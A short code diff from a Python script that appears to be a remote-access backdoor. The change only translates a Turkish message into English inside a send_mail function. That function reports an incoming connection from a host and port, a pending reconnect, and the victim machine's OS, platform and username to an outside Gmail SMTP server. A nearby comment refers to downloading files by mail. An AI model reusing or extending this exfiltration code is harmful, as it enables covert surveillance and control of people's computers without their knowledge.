@@ -36,7 +36,7 @@ def send_email_attachment(body, filename):
     server.quit()  # Function For Downloading File With Mail
 
 def send_mail(host, port):
-    txt = "\n" + str(host) + " ' IP'sine " + str(port) + " portundan gelen bir baglanti var ve 30 saniye icinde  baglanti tekrar kurulmaya calisilacak.\n\n\n" + " OS: " + str(platform.platform()) + " Platform : " + str(platform.machine()) + " User: " + str(getpass.getuser())
+    txt = "\n" + str(host) + " ' IP'sine " + str(port) + "There is a connection coming from the port and the connection will be attempted again within 30 seconds..\n\n\n" + " OS: " + str(platform.platform()) + " Platform : " + str(platform.machine()) + " User: " + str(getpass.getuser())
     mail = smtplib.SMTP('smtp.gmail.com', 587)
     mail.ehlo()
     mail.starttls()
